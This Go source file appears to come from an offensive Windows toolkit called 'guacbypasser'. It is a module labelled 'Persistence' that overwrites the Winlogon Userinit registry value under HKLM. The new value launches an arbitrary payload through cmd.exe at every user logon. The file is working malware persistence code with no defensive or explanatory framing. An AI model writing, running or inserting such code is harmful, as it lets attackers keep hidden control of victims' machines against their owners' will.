package guacbypasser

import (
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// C:\Windows\system32\userinit.exe,
func w32_nt_persistence_userinit(p string) (error, Informer) {
	inf := Informer{
		Name: "Userinit",
		Desc: "Gain persistence using Userinit registry key",
		Id:   11,

		Type:   "Persistence",
		Module: "w32_nt_persistence_userinit",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fPath)

	wk32, err := registry.OpenKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}
	if err := wk32.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), cmdN)); err != nil {
		return err, inf
	}
	return nil, inf
}

// NewPersistenceUSERINIT #add-some-info-please
func NewPersistenceUSERINIT(p string) (error, Informer) { return w32_nt_persistence_userinit(p) }
